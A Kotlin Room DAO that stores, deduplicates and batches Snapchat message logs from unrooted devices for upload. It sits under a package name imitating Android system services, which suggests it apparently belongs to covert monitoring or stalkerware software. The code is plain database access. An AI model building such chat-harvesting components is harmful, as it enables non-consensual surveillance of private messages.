package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.SnapChatUnrooted
import com.android.services.util.AppConstants

@Dao
interface SnapChatUnrootedDao {
    
    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(snapChatUnrooted: SnapChatUnrooted)

    @Query("Select uniqueId from snapchat_unrooted_table where uniqueId = :messageId")
    fun checkSnapChatIfAlreadyExist(messageId: String): String?

    @Query("Select * from snapchat_unrooted_table where status = :status order by id ASC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllSnapChatUnrootedLogs(status: Int): List<SnapChatUnrooted>

    @Query("Update snapchat_unrooted_table set status = :updated_status where id BETWEEN :startId AND :endId")
    fun update(startId: Int, endId: Int, updated_status: Int): Int
}